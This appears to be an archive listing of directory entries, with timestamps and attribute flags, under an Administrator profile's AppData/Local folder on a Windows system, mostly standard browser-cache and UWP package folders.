2025-02-16 11:10:30 D.HS.                            Administrator/AppData/Local/Microsoft/Windows/INetCache
2025-02-16 10:59:25 D.HS.                            Administrator/AppData/Local/Microsoft/Windows/INetCookies
2025-02-16 10:48:47 D....                            Administrator/AppData/Local/Microsoft/Windows/Notifications
2025-02-16 10:48:48 D....                            Administrator/AppData/Local/Microsoft/Windows/Ringtones
2025-02-16 10:48:48 D....                            Administrator/AppData/Local/Microsoft/Windows/RoamingTiles
2025-02-16 10:48:50 D....                            Administrator/AppData/Local/Microsoft/Windows/Safety
2021-05-08 08:34:49 D....                            Administrator/AppData/Local/Microsoft/Windows/Shell
2025-02-16 10:48:48 D.HS.                            Administrator/AppData/Local/Microsoft/Windows/WebCache
2021-05-08 08:20:24 D....                            Administrator/AppData/Local/Microsoft/Windows/WinX
2025-02-16 10:48:53 DRH..                            Administrator/AppData/Local/Microsoft/Windows/Burn/Burn
2025-02-16 11:04:05 D....                            Administrator/AppData/Local/Microsoft/Windows/Explorer/NotifyIcon
2025-02-16 11:18:05 D.HS.                            Administrator/AppData/Local/Microsoft/Windows/History/History.IE5
2025-02-16 10:48:48 D....                            Administrator/AppData/Local/Microsoft/Windows/History/Low
2025-02-16 11:18:05 D.HS.                            Administrator/AppData/Local/Microsoft/Windows/History/History.IE5/MSHist012025021620250217
2025-02-16 10:48:48 D.H..                            Administrator/AppData/Local/Microsoft/Windows/IECompatCache/Low
2025-02-16 10:48:48 D.H..                            Administrator/AppData/Local/Microsoft/Windows/IECompatUaCache/Low
2025-02-16 10:59:45 D.HS.                            Administrator/AppData/Local/Microsoft/Windows/INetCache/IE
2025-02-16 11:10:30 D....                            Administrator/AppData/Local/Microsoft/Windows/INetCache/Low
2025-02-16 11:10:30 D.H..                            Administrator/AppData/Local/Microsoft/Windows/INetCache/Virtualized
2025-02-16 10:48:48 D....                            Administrator/AppData/Local/Microsoft/Windows/INetCookies/DNTException
2025-02-16 10:52:04 D.HS.                            Administrator/AppData/Local/Microsoft/Windows/INetCookies/ESE
2025-02-16 10:48:48 D....                            Administrator/AppData/Local/Microsoft/Windows/INetCookies/Low
2025-02-16 10:48:48 D....                            Administrator/AppData/Local/Microsoft/Windows/INetCookies/PrivacIE
2025-02-16 10:48:48 D.H..                            Administrator/AppData/Local/Microsoft/Windows/INetCookies/DNTException/Low
2025-02-16 10:48:48 D.H..                            Administrator/AppData/Local/Microsoft/Windows/INetCookies/PrivacIE/Low
2025-02-16 10:48:47 D....                            Administrator/AppData/Local/Microsoft/Windows/Notifications/wpnidm
2025-02-16 10:48:50 D....                            Administrator/AppData/Local/Microsoft/Windows/Safety/shell
2025-02-16 10:48:50 D....                            Administrator/AppData/Local/Microsoft/Windows/Safety/shell/remote
2021-05-08 08:20:35 DR...                            Administrator/AppData/Local/Microsoft/Windows/WinX/Group1
2021-05-08 08:20:35 DR...                            Administrator/AppData/Local/Microsoft/Windows/WinX/Group2
2021-05-08 08:20:35 DR...                            Administrator/AppData/Local/Microsoft/Windows/WinX/Group3
2021-05-08 08:20:24 D....                            Administrator/AppData/Local/Microsoft/Windows Sidebar/Gadgets
2025-02-16 10:49:01 D....                            Administrator/AppData/Local/Microsoft_Corporation/ServerManager.exe_StrongName_m3xk0k0ucj0oj3ai2hibnhnv4xobnimj
2025-02-16 11:18:27 D....                            Administrator/AppData/Local/Microsoft_Corporation/ServerManager.exe_StrongName_m3xk0k0ucj0oj3ai2hibnhnv4xobnimj/10.0.0.0
2025-02-16 11:11:03 D....                            Administrator/AppData/Local/Packages/1527c705-839a-4832-9118-54d4Bd6a0c89_cw5n1h2txyewy
2025-02-16 11:11:03 D....                            Administrator/AppData/Local/Packages/c5e2524a-ea46-4f67-841f-6a9465d9d515_cw5n1h2txyewy
2025-02-16 11:11:03 D....                            Administrator/AppData/Local/Packages/E2A4F912-2574-4A75-9BB0-0D023378592B_cw5n1h2txyewy
2025-02-16 11:11:02 D....                            Administrator/AppData/Local/Packages/F46D4000-FD22-4DB4-AC8E-4E1DDDE828FE_cw5n1h2txyewy
2025-02-16 10:48:48 D....                            Administrator/AppData/Local/Packages/Microsoft.AAD.BrokerPlugin_cw5n1h2txyewy
2025-02-16 11:11:02 D....                            Administrator/AppData/Local/Packages/Microsoft.AccountsControl_cw5n1h2txyewy
2025-02-16 11:11:02 D....                            Administrator/AppData/Local/Packages/Microsoft.AsyncTextService_8wekyb3d8bbwe
2025-02-16 10:48:48 D....                            Administrator/AppData/Local/Packages/Microsoft.BioEnrollment_cw5n1h2txyewy
2025-02-16 11:11:02 D....                            Administrator/AppData/Local/Packages/Microsoft.CredDialogHost_cw5n1h2txyewy
2025-02-16 11:11:02 D....                            Administrator/AppData/Local/Packages/Microsoft.ECApp_8wekyb3d8bbwe
2025-02-16 11:11:02 D....                            Administrator/AppData/Local/Packages/Microsoft.LockApp_cw5n1h2txyewy
2025-02-16 11:11:01 D....                            Administrator/AppData/Local/Packages/Microsoft.UI.Xaml.2.4_8wekyb3d8bbwe
2025-02-16 10:48:49 D....                            Administrator/AppData/Local/Packages/Microsoft.VCLibs.140.00_8wekyb3d8bbwe
2025-02-16 11:11:02 D....                            Administrator/AppData/Local/Packages/Microsoft.Win32WebViewHost_cw5n1h2txyewy
2025-02-16 11:11:01 D....                            Administrator/AppData/Local/Packages/Microsoft.Windows.Apprep.ChxApp_cw5n1h2txyewy
2025-02-16 11:11:01 D....                            Administrator/AppData/Local/Packages/Microsoft.Windows.CapturePicker_cw5n1h2txyewy
2025-02-16 10:48:48 D....                            Administrator/AppData/Local/Packages/Microsoft.Windows.CloudExperienceHost_cw5n1h2txyewy
2025-02-16 11:11:01 D....                            Administrator/AppData/Local/Packages/Microsoft.Windows.NarratorQuickStart_8wekyb3d8bbwe
2025-02-16 10:48:48 D....                            Administrator/AppData/Local/Packages/Microsoft.Windows.OOBENetworkCaptivePortal_cw5n1h2txyewy
2025-02-16 10:48:48 D....                            Administrator/AppData/Local/Packages/Microsoft.Windows.OOBENetworkConnectionFlow_cw5n1h2txyewy
2025-02-16 11:11:01 D....                            Administrator/AppData/Local/Packages/Microsoft.Windows.PeopleExperienceHost_cw5n1h2txyewy
2025-02-16 11:11:01 D....                            Administrator/AppData/Local/Packages/Microsoft.Windows.PinningConfirmationDialog_cw5n1h2txyewy
2025-02-16 10:48:50 D....                            Administrator/AppData/Local/Packages/Microsoft.Windows.Search_cw5n1h2txyewy
2025-02-16 11:11:01 D....                            Administrator/AppData/Local/Packages/Microsoft.Windows.SecHealthUI_cw5n1h2txyewy
2025-02-16 10:48:49 D....                            Administrator/AppData/Local/Packages/Microsoft.Windows.ShellExperienceHost_cw5n1h2txyewy
2025-02-16 10:48:49 D....                            Administrator/AppData/Local/Packages/Microsoft.Windows.StartMenuExperienceHost_cw5n1h2txyewy
2025-02-16 11:11:00 D....                            Administrator/AppData/Local/Packages/Microsoft.Windows.XGpuEjectDialog_cw5n1h2txyewy
2025-02-16 10:48:49 D....                            Administrator/AppData/Local/Packages/MicrosoftWindows.Client.CBS_cw5n1h2txyewy
2025-02-16 11:11:00 D....                            Administrator/AppData/Local/Packages/MicrosoftWindows.UndockedDevKit_cw5n1h2txyewy
2025-02-16 11:11:00 D....                            Administrator/AppData/Local/Packages/Windows.CBSPreview_cw5n1h2txyewy
2025-02-16 10:48:49 D....                            Administrator/AppData/Local/Packages/windows.immersivecontrolpanel_cw5n1h2txyewy
2025-02-16 11:11:00 D....                            Administrator/AppData/Local/Packages/Windows.PrintDialog_cw5n1h2txyewy
2025-02-16 11:11:03 D....                            Administrator/AppData/Local/Packages/1527c705-839a-4832-9118-54d4Bd6a0c89_cw5n1h2txyewy/AC
2025-02-16 11:11:03 D....                            Administrator/AppData/Local/Packages/1527c705-839a-4832-9118-54d4Bd6a0c89_cw5n1h2txyewy/AppData
2025-02-16 11:11:03 D....                            Administrator/AppData/Local/Packages/1527c705-839a-4832-9118-54d4Bd6a0c89_cw5n1h2txyewy/LocalCache
2025-02-16 11:11:03 D....                            Administrator/AppData/Local/Packages/1527c705-839a-4832-9118-54d4Bd6a0c89_cw5n1h2txyewy/LocalState
2025-02-16 11:11:03 D....                            Administrator/AppData/Local/Packages/1527c705-839a-4832-9118-54d4Bd6a0c89_cw5n1h2txyewy/RoamingState
2025-02-16 11:11:03 D....                            Administrator/AppData/Local/Packages/1527c705-839a-4832-9118-54d4Bd6a0c89_cw5n1h2txyewy/Settings
2025-02-16 11:11:03 D....                            Administrator/AppData/Local/Packages/1527c705-839a-4832-9118-54d4Bd6a0c89_cw5n1h2txyewy/SystemAppData
2025-02-16 11:11:03 D....                            Administrator/AppData/Local/Packages/1527c705-839a-4832-9118-54d4Bd6a0c89_cw5n1h2txyewy/TempState
2025-02-16 11:11:03 D.HS.                            Administrator/AppData/Local/Packages/1527c705-839a-4832-9118-54d4Bd6a0c89_cw5n1h2txyewy/AC/INetCache
2025-02-16 11:11:03 D.HS.                            Administrator/AppData/Local/Packages/1527c705-839a-4832-9118-54d4Bd6a0c89_cw5n1h2txyewy/AC/INetCookies
2025-02-16 11:11:03 D.HS.                            Administrator/AppData/Local/Packages/1527c705-839a-4832-9118-54d4Bd6a0c89_cw5n1h2txyewy/AC/INetHistory
2025-02-16 11:11:03 D....                            Administrator/AppData/Local/Packages/1527c705-839a-4832-9118-54d4Bd6a0c89_cw5n1h2txyewy/AC/Temp
2025-02-16 11:11:03 D....                            Administrator/AppData/Local/Packages/c5e2524a-ea46-4f67-841f-6a9465d9d515_cw5n1h2txyewy/AC
2025-02-16 11:11:03 D....                            Administrator/AppData/Local/Packages/c5e2524a-ea46-4f67-841f-6a9465d9d515_cw5n1h2txyewy/AppData
2025-02-16 11:11:03 D....                            Administrator/AppData/Local/Packages/c5e2524a-ea46-4f67-841f-6a9465d9d515_cw5n1h2txyewy/LocalCache
2025-02-16 11:11:03 D....                            Administrator/AppData/Local/Packages/c5e2524a-ea46-4f67-841f-6a9465d9d515_cw5n1h2txyewy/LocalState
2025-02-16 11:11:03 D....                            Administrator/AppData/Local/Packages/c5e2524a-ea46-4f67-841f-6a9465d9d515_cw5n1h2txyewy/RoamingState
2025-02-16 11:11:03 D....                            Administrator/AppData/Local/Packages/c5e2524a-ea46-4f67-841f-6a9465d9d515_cw5n1h2txyewy/Settings
2025-02-16 11:11:03 D....                            Administrator/AppData/Local/Packages/c5e2524a-ea46-4f67-841f-6a9465d9d515_cw5n1h2txyewy/SystemAppData
2025-02-16 11:11:03 D....                            Administrator/AppData/Local/Packages/c5e2524a-ea46-4f67-841f-6a9465d9d515_cw5n1h2txyewy/TempState
2025-02-16 11:11:03 D.HS.                            Administrator/AppData/Local/Packages/c5e2524a-ea46-4f67-841f-6a9465d9d515_cw5n1h2txyewy/AC/INetCache
2025-02-16 11:11:03 D.HS.                            Administrator/AppData/Local/Packages/c5e2524a-ea46-4f67-841f-6a9465d9d515_cw5n1h2txyewy/AC/INetCookies
2025-02-16 11:11:03 D.HS.                            Administrator/AppData/Local/Packages/c5e2524a-ea46-4f67-841f-6a9465d9d515_cw5n1h2txyewy/AC/INetHistory
2025-02-16 11:11:03 D....                            Administrator/AppData/Local/Packages/c5e2524a-ea46-4f67-841f-6a9465d9d515_cw5n1h2txyewy/AC/Temp
2025-02-16 11:11:03 D....                            Administrator/AppData/Local/Packages/E2A4F912-2574-4A75-9BB0-0D023378592B_cw5n1h2txyewy/AC
2025-02-16 11:11:03 D....                            Administrator/AppData/Local/Packages/E2A4F912-2574-4A75-9BB0-0D023378592B_cw5n1h2txyewy/AppData
2025-02-16 11:11:03 D....                            Administrator/AppData/Local/Packages/E2A4F912-2574-4A75-9BB0-0D023378592B_cw5n1h2txyewy/LocalCache
2025-02-16 11:11:03 D....                            Administrator/AppData/Local/Packages/E2A4F912-2574-4A75-9BB0-0D023378592B_cw5n1h2txyewy/LocalState
2025-02-16 11:11:03 D....                            Administrator/AppData/Local/Packages/E2A4F912-2574-4A75-9BB0-0D023378592B_cw5n1h2txyewy/RoamingState
2025-02-16 11:11:03 D....                            Administrator/AppData/Local/Packages/E2A4F912-2574-4A75-9BB0-0D023378592B_cw5n1h2txyewy/Settings
2025-02-16 11:11:03 D....                            Administrator/AppData/Local/Packages/E2A4F912-2574-4A75-9BB0-0D023378592B_cw5n1h2txyewy/SystemAppData
2025-02-16 11:11:03 D....                            Administrator/AppData/Local/Packages/E2A4F912-2574-4A75-9BB0-0D023378592B_cw5n1h2txyewy/TempState
2025-02-16 11:11:03 D.HS.                            Administrator/AppData/Local/Packages/E2A4F912-2574-4A75-9BB0-0D023378592B_cw5n1h2txyewy/AC/INetCache
2025-02-16 11:11:03 D.HS.                            Administrator/AppData/Local/Packages/E2A4F912-2574-4A75-9BB0-0D023378592B_cw5n1h2txyewy/AC/INetCookies
2025-02-16 11:11:03 D.HS.                            Administrator/AppData/Local/Packages/E2A4F912-2574-4A75-9BB0-0D023378592B_cw5n1h2txyewy/AC/INetHistory
2025-02-16 11:11:03 D....                            Administrator/AppData/Local/Packages/E2A4F912-2574-4A75-9BB0-0D023378592B_cw5n1h2txyewy/AC/Temp
2025-02-16 11:11:02 D....                            Administrator/AppData/Local/Packages/F46D4000-FD22-4DB4-AC8E-4E1DDDE828FE_cw5n1h2txyewy/AC
2025-02-16 11:11:02 D....                            Administrator/AppData/Local/Packages/F46D4000-FD22-4DB4-AC8E-4E1DDDE828FE_cw5n1h2txyewy/AppData
2025-02-16 11:11:02 D....                            Administrator/AppData/Local/Packages/F46D4000-FD22-4DB4-AC8E-4E1DDDE828FE_cw5n1h2txyewy/LocalCache
2025-02-16 11:11:02 D....                            Administrator/AppData/Local/Packages/F46D4000-FD22-4DB4-AC8E-4E1DDDE828FE_cw5n1h2txyewy/LocalState
2025-02-16 11:11:02 D....                            Administrator/AppData/Local/Packages/F46D4000-FD22-4DB4-AC8E-4E1DDDE828FE_cw5n1h2txyewy/RoamingState
2025-02-16 11:11:02 D....                            Administrator/AppData/Local/Packages/F46D4000-FD22-4DB4-AC8E-4E1DDDE828FE_cw5n1h2txyewy/Settings
2025-02-16 11:11:02 D....                            Administrator/AppData/Local/Packages/F46D4000-FD22-4DB4-AC8E-4E1DDDE828FE_cw5n1h2txyewy/SystemAppData
2025-02-16 11:11:02 D....                            Administrator/AppData/Local/Packages/F46D4000-FD22-4DB4-AC8E-4E1DDDE828FE_cw5n1h2txyewy/TempState
2025-02-16 11:11:02 D.HS.                            Administrator/AppData/Local/Packages/F46D4000-FD22-4DB4-AC8E-4E1DDDE828FE_cw5n1h2txyewy/AC/INetCache
2025-02-16 11:11:02 D.HS.                            Administrator/AppData/Local/Packages/F46D4000-FD22-4DB4-AC8E-4E1DDDE828FE_cw5n1h2txyewy/AC/INetCookies
2025-02-16 11:11:02 D.HS.                            Administrator/AppData/Local/Packages/F46D4000-FD22-4DB4-AC8E-4E1DDDE828FE_cw5n1h2txyewy/AC/INetHistory
2025-02-16 11:11:02 D....                            Administrator/AppData/Local/Packages/F46D4000-FD22-4DB4-AC8E-4E1DDDE828FE_cw5n1h2txyewy/AC/Temp
2025-02-16 10:48:48 D....                            Administrator/AppData/Local/Packages/Microsoft.AAD.BrokerPlugin_cw5n1h2txyewy/AC
2025-02-16 10:48:48 D....                            Administrator/AppData/Local/Packages/Microsoft.AAD.BrokerPlugin_cw5n1h2txyewy/AppData
2025-02-16 10:48:48 D....                            Administrator/AppData/Local/Packages/Microsoft.AAD.BrokerPlugin_cw5n1h2txyewy/LocalCache
2025-02-16 10:48:48 D....                            Administrator/AppData/Local/Packages/Microsoft.AAD.BrokerPlugin_cw5n1h2txyewy/LocalState
2025-02-16 10:48:48 D....                            Administrator/AppData/Local/Packages/Microsoft.AAD.BrokerPlugin_cw5n1h2txyewy/RoamingState
2025-02-16 10:48:53 D....                            Administrator/AppData/Local/Packages/Microsoft.AAD.BrokerPlugin_cw5n1h2txyewy/Settings
2025-02-16 10:48:48 D....                            Administrator/AppData/Local/Packages/Microsoft.AAD.BrokerPlugin_cw5n1h2txyewy/SystemAppData
2025-02-16 10:48:48 D....                            Administrator/AppData/Local/Packages/Microsoft.AAD.BrokerPlugin_cw5n1h2txyewy/TempState
2025-02-16 10:48:48 D.HS.                            Administrator/AppData/Local/Packages/Microsoft.AAD.BrokerPlugin_cw5n1h2txyewy/AC/INetCache
2025-02-16 10:48:48 D.HS.                            Administrator/AppData/Local/Packages/Microsoft.AAD.BrokerPlugin_cw5n1h2txyewy/AC/INetCookies
2025-02-16 10:48:48 D.HS.                            Administrator/AppData/Local/Packages/Microsoft.AAD.BrokerPlugin_cw5n1h2txyewy/AC/INetHistory
2025-02-16 10:48:48 D....                            Administrator/AppData/Local/Packages/Microsoft.AAD.BrokerPlugin_cw5n1h2txyewy/AC/Temp
2025-02-16 11:11:02 D....                            Administrator/AppData/Local/Packages/Microsoft.AccountsControl_cw5n1h2txyewy/AC
2025-02-16 11:11:02 D....                            Administrator/AppData/Local/Packages/Microsoft.AccountsControl_cw5n1h2txyewy/AppData
2025-02-16 11:11:02 D....                            Administrator/AppData/Local/Packages/Microsoft.AccountsControl_cw5n1h2txyewy/LocalCache
2025-02-16 11:11:02 D....                            Administrator/AppData/Local/Packages/Microsoft.AccountsControl_cw5n1h2txyewy/LocalState
2025-02-16 11:11:02 D....                            Administrator/AppData/Local/Packages/Microsoft.AccountsControl_cw5n1h2txyewy/RoamingState
2025-02-16 11:11:02 D....                            Administrator/AppData/Local/Packages/Microsoft.AccountsControl_cw5n1h2txyewy/Settings
2025-02-16 11:11:02 D....                            Administrator/AppData/Local/Packages/Microsoft.AccountsControl_cw5n1h2txyewy/SystemAppData
2025-02-16 11:11:02 D....                            Administrator/AppData/Local/Packages/Microsoft.AccountsControl_cw5n1h2txyewy/TempState
2025-02-16 11:11:02 D.HS.                            Administrator/AppData/Local/Packages/Microsoft.AccountsControl_cw5n1h2txyewy/AC/INetCache
2025-02-16 11:11:02 D.HS.                            Administrator/AppData/Local/Packages/Microsoft.AccountsControl_cw5n1h2txyewy/AC/INetCookies
2025-02-16 11:11:02 D.HS.                            Administrator/AppData/Local/Packages/Microsoft.AccountsControl_cw5n1h2txyewy/AC/INetHistory
2025-02-16 11:11:02 D....                            Administrator/AppData/Local/Packages/Microsoft.AccountsControl_cw5n1h2txyewy/AC/Temp
2025-02-16 11:11:02 D....                            Administrator/AppData/Local/Packages/Microsoft.AsyncTextService_8wekyb3d8bbwe/AC
2025-02-16 11:11:02 D....                            Administrator/AppData/Local/Packages/Microsoft.AsyncTextService_8wekyb3d8bbwe/AppData
2025-02-16 11:11:02 D....                            Administrator/AppData/Local/Packages/Microsoft.AsyncTextService_8wekyb3d8bbwe/LocalCache
2025-02-16 11:11:02 D....                            Administrator/AppData/Local/Packages/Microsoft.AsyncTextService_8wekyb3d8bbwe/LocalState
2025-02-16 11:11:02 D....                            Administrator/AppData/Local/Packages/Microsoft.AsyncTextService_8wekyb3d8bbwe/RoamingState
2025-02-16 11:11:02 D....                            Administrator/AppData/Local/Packages/Microsoft.AsyncTextService_8wekyb3d8bbwe/Settings
2025-02-16 11:11:02 D....                            Administrator/AppData/Local/Packages/Microsoft.AsyncTextService_8wekyb3d8bbwe/SystemAppData
2025-02-16 11:11:02 D....                            Administrator/AppData/Local/Packages/Microsoft.AsyncTextService_8wekyb3d8bbwe/TempState
2025-02-16 11:11:02 D.HS.                            Administrator/AppData/Local/Packages/Microsoft.AsyncTextService_8wekyb3d8bbwe/AC/INetCache
2025-02-16 11:11:02 D.HS.                            Administrator/AppData/Local/Packages/Microsoft.AsyncTextService_8wekyb3d8bbwe/AC/INetCookies
2025-02-16 11:11:02 D.HS.                            Administrator/AppData/Local/Packages/Microsoft.AsyncTextService_8wekyb3d8bbwe/AC/INetHistory
2025-02-16 11:11:02 D....                            Administrator/AppData/Local/Packages/Microsoft.AsyncTextService_8wekyb3d8bbwe/AC/Temp
2025-02-16 10:48:48 D....                            Administrator/AppData/Local/Packages/Microsoft.BioEnrollment_cw5n1h2txyewy/AC
2025-02-16 10:48:48 D....                            Administrator/AppData/Local/Packages/Microsoft.BioEnrollment_cw5n1h2txyewy/AppData
2025-02-16 10:48:48 D....                            Administrator/AppData/Local/Packages/Microsoft.BioEnrollment_cw5n1h2txyewy/LocalCache
2025-02-16 10:48:48 D....                            Administrator/AppData/Local/Packages/Microsoft.BioEnrollment_cw5n1h2txyewy/LocalState
2025-02-16 10:48:48 D....                            Administrator/AppData/Local/Packages/Microsoft.BioEnrollment_cw5n1h2txyewy/RoamingState
2025-02-16 10:48:48 D....                            Administrator/AppData/Local/Packages/Microsoft.BioEnrollment_cw5n1h2txyewy/Settings
2025-02-16 10:48:48 D....                            Administrator/AppData/Local/Packages/Microsoft.BioEnrollment_cw5n1h2txyewy/SystemAppData
2025-02-16 10:48:48 D....                            Administrator/AppData/Local/Packages/Microsoft.BioEnrollment_cw5n1h2txyewy/TempState
2025-02-16 10:48:48 D.HS.                            Administrator/AppData/Local/Packages/Microsoft.BioEnrollment_cw5n1h2txyewy/AC/INetCache
2025-02-16 10:48:48 D.HS.                            Administrator/AppData/Local/Packages/Microsoft.BioEnrollment_cw5n1h2txyewy/AC/INetCookies
2025-02-16 10:48:48 D.HS.                            Administrator/AppData/Local/Packages/Microsoft.BioEnrollment_cw5n1h2txyewy/AC/INetHistory
2025-02-16 10:48:48 D....                            Administrator/AppData/Local/Packages/Microsoft.BioEnrollment_cw5n1h2txyewy/AC/Temp
2025-02-16 11:11:02 D....                            Administrator/AppData/Local/Packages/Microsoft.CredDialogHost_cw5n1h2txyewy/AC
2025-02-16 11:11:02 D....                            Administrator/AppData/Local/Packages/Microsoft.CredDialogHost_cw5n1h2txyewy/AppData
2025-02-16 11:11:02 D....                            Administrator/AppData/Local/Packages/Microsoft.CredDialogHost_cw5n1h2txyewy/LocalCache
2025-02-16 11:11:02 D....                            Administrator/AppData/Local/Packages/Microsoft.CredDialogHost_cw5n1h2txyewy/LocalState
2025-02-16 11:11:02 D....                            Administrator/AppData/Local/Packages/Microsoft.CredDialogHost_cw5n1h2txyewy/RoamingState
2025-02-16 11:11:02 D....                            Administrator/AppData/Local/Packages/Microsoft.CredDialogHost_cw5n1h2txyewy/Settings
2025-02-16 11:11:02 D....                            Administrator/AppData/Local/Packages/Microsoft.CredDialogHost_cw5n1h2txyewy/SystemAppData
2025-02-16 11:11:02 D....                            Administrator/AppData/Local/Packages/Microsoft.CredDialogHost_cw5n1h2txyewy/TempState
2025-02-16 11:11:02 D.HS.                            Administrator/AppData/Local/Packages/Microsoft.CredDialogHost_cw5n1h2txyewy/AC/INetCache
2025-02-16 11:11:02 D.HS.                            Administrator/AppData/Local/Packages/Microsoft.CredDialogHost_cw5n1h2txyewy/AC/INetCookies
2025-02-16 11:11:02 D.HS.                            Administrator/AppData/Local/Packages/Microsoft.CredDialogHost_cw5n1h2txyewy/AC/INetHistory
2025-02-16 11:11:02 D....                            Administrator/AppData/Local/Packages/Microsoft.CredDialogHost_cw5n1h2txyewy/AC/Temp
2025-02-16 11:11:02 D....                            Administrator/AppData/Local/Packages/Microsoft.ECApp_8wekyb3d8bbwe/AC
2025-02-16 11:11:02 D....                            Administrator/AppData/Local/Packages/Microsoft.ECApp_8wekyb3d8bbwe/AppData
2025-02-16 11:11:02 D....                            Administrator/AppData/Local/Packages/Microsoft.ECApp_8wekyb3d8bbwe/LocalCache
2025-02-16 11:11:02 D....                            Administrator/AppData/Local/Packages/Microsoft.ECApp_8wekyb3d8bbwe/LocalState
2025-02-16 11:11:02 D....                            Administrator/AppData/Local/Packages/Microsoft.ECApp_8wekyb3d8bbwe/RoamingState
2025-02-16 11:11:02 D....                            Administrator/AppData/Local/Packages/Microsoft.ECApp_8wekyb3d8bbwe/Settings
2025-02-16 11:11:02 D....                            Administrator/AppData/Local/Packages/Microsoft.ECApp_8wekyb3d8bbwe/SystemAppData
2025-02-16 11:11:02 D....                            Administrator/AppData/Local/Packages/Microsoft.ECApp_8wekyb3d8bbwe/TempState
2025-02-16 11:11:02 D.HS.                            Administrator/AppData/Local/Packages/Microsoft.ECApp_8wekyb3d8bbwe/AC/INetCache
2025-02-16 11:11:02 D.HS.                            Administrator/AppData/Local/Packages/Microsoft.ECApp_8wekyb3d8bbwe/AC/INetCookies
2025-02-16 11:11:02 D.HS.                            Administrator/AppData/Local/Packages/Microsoft.ECApp_8wekyb3d8bbwe/AC/INetHistory
2025-02-16 11:11:02 D....                            Administrator/AppData/Local/Packages/Microsoft.ECApp_8wekyb3d8bbwe/AC/Temp
2025-02-16 11:11:02 D....                            Administrator/AppData/Local/Packages/Microsoft.LockApp_cw5n1h2txyewy/AC
2025-02-16 11:11:02 D....                            Administrator/AppData/Local/Packages/Microsoft.LockApp_cw5n1h2txyewy/AppData
2025-02-16 11:11:02 D....                            Administrator/AppData/Local/Packages/Microsoft.LockApp_cw5n1h2txyewy/LocalCache
2025-02-16 11:11:02 D....                            Administrator/AppData/Local/Packages/Microsoft.LockApp_cw5n1h2txyewy/LocalState
2025-02-16 11:11:02 D....                            Administrator/AppData/Local/Packages/Microsoft.LockApp_cw5n1h2txyewy/RoamingState
2025-02-16 11:11:02 D....                            Administrator/AppData/Local/Packages/Microsoft.LockApp_cw5n1h2txyewy/Settings
2025-02-16 11:11:02 D....                            Administrator/AppData/Local/Packages/Microsoft.LockApp_cw5n1h2txyewy/SystemAppData
2025-02-16 11:11:02 D....                            Administrator/AppData/Local/Packages/Microsoft.LockApp_cw5n1h2txyewy/TempState
2025-02-16 11:11:02 D.HS.                            Administrator/AppData/Local/Packages/Microsoft.LockApp_cw5n1h2txyewy/AC/INetCache
2025-02-16 11:11:02 D.HS.                            Administrator/AppData/Local/Packages/Microsoft.LockApp_cw5n1h2txyewy/AC/INetCookies
2025-02-16 11:11:02 D.HS.                            Administrator/AppData/Local/Packages/Microsoft.LockApp_cw5n1h2txyewy/AC/INetHistory
2025-02-16 11:11:02 D....                            Administrator/AppData/Local/Packages/Microsoft.LockApp_cw5n1h2txyewy/AC/Temp
2025-02-16 11:11:01 D....                            Administrator/AppData/Local/Packages/Microsoft.UI.Xaml.2.4_8wekyb3d8bbwe/AC
2025-02-16 11:11:01 D.HS.                            Administrator/AppData/Local/Packages/Microsoft.UI.Xaml.2.4_8wekyb3d8bbwe/AC/INetCache
2025-02-16 11:11:01 D.HS.                            Administrator/AppData/Local/Packages/Microsoft.UI.Xaml.2.4_8wekyb3d8bbwe/AC/INetCookies
2025-02-16 11:11:01 D.HS.                            Administrator/AppData/Local/Packages/Microsoft.UI.Xaml.2.4_8wekyb3d8bbwe/AC/INetHistory
2025-02-16 11:11:01 D....                            Administrator/AppData/Local/Packages/Microsoft.UI.Xaml.2.4_8wekyb3d8bbwe/AC/Temp
2025-02-16 10:48:49 D....                            Administrator/AppData/Local/Packages/Microsoft.VCLibs.140.00_8wekyb3d8bbwe/AC
2025-02-16 10:48:49 D.HS.                            Administrator/AppData/Local/Packages/Microsoft.VCLibs.140.00_8wekyb3d8bbwe/AC/INetCache
2025-02-16 10:48:49 D.HS.                            Administrator/AppData/Local/Packages/Microsoft.VCLibs.140.00_8wekyb3d8bbwe/AC/INetCookies
2025-02-16 10:48:49 D.HS.                            Administrator/AppData/Local/Packages/Microsoft.VCLibs.140.00_8wekyb3d8bbwe/AC/INetHistory
2025-02-16 10:48:49 D....                            Administrator/AppData/Local/Packages/Microsoft.VCLibs.140.00_8wekyb3d8bbwe/AC/Temp
2025-02-16 11:11:02 D....                            Administrator/AppData/Local/Packages/Microsoft.Win32WebViewHost_cw5n1h2txyewy/AC
2025-02-16 11:11:02 D....                            Administrator/AppData/Local/Packages/Microsoft.Win32WebViewHost_cw5n1h2txyewy/AppData
2025-02-16 11:11:02 D....                            Administrator/AppData/Local/Packages/Microsoft.Win32WebViewHost_cw5n1h2txyewy/LocalCache
2025-02-16 11:11:02 D....                            Administrator/AppData/Local/Packages/Microsoft.Win32WebViewHost_cw5n1h2txyewy/LocalState
2025-02-16 11:11:02 D....                            Administrator/AppData/Local/Packages/Microsoft.Win32WebViewHost_cw5n1h2txyewy/RoamingState
2025-02-16 11:11:02 D....                            Administrator/AppData/Local/Packages/Microsoft.Win32WebViewHost_cw5n1h2txyewy/Settings
2025-02-16 11:11:02 D....                            Administrator/AppData/Local/Packages/Microsoft.Win32WebViewHost_cw5n1h2txyewy/SystemAppData
2025-02-16 11:11:02 D....                            Administrator/AppData/Local/Packages/Microsoft.Win32WebViewHost_cw5n1h2txyewy/TempState
2025-02-16 11:11:02 D.HS.                            Administrator/AppData/Local/Packages/Microsoft.Win32WebViewHost_cw5n1h2txyewy/AC/INetCache
2025-02-16 11:11:02 D.HS.                            Administrator/AppData/Local/Packages/Microsoft.Win32WebViewHost_cw5n1h2txyewy/AC/INetCookies
2025-02-16 11:11:02 D.HS.                            Administrator/AppData/Local/Packages/Microsoft.Win32WebViewHost_cw5n1h2txyewy/AC/INetHistory
2025-02-16 11:11:02 D....                            Administrator/AppData/Local/Packages/Microsoft.Win32WebViewHost_cw5n1h2txyewy/AC/Temp
2025-02-16 11:11:01 D....                            Administrator/AppData/Local/Packages/Microsoft.Windows.Apprep.ChxApp_cw5n1h2txyewy/AC
2025-02-16 11:11:01 D....                            Administrator/AppData/Local/Packages/Microsoft.Windows.Apprep.ChxApp_cw5n1h2txyewy/AppData
2025-02-16 11:11:01 D....                            Administrator/AppData/Local/Packages/Microsoft.Windows.Apprep.ChxApp_cw5n1h2txyewy/LocalCache
2025-02-16 11:11:01 D....                            Administrator/AppData/Local/Packages/Microsoft.Windows.Apprep.ChxApp_cw5n1h2txyewy/LocalState
2025-02-16 11:11:01 D....                            Administrator/AppData/Local/Packages/Microsoft.Windows.Apprep.ChxApp_cw5n1h2txyewy/RoamingState
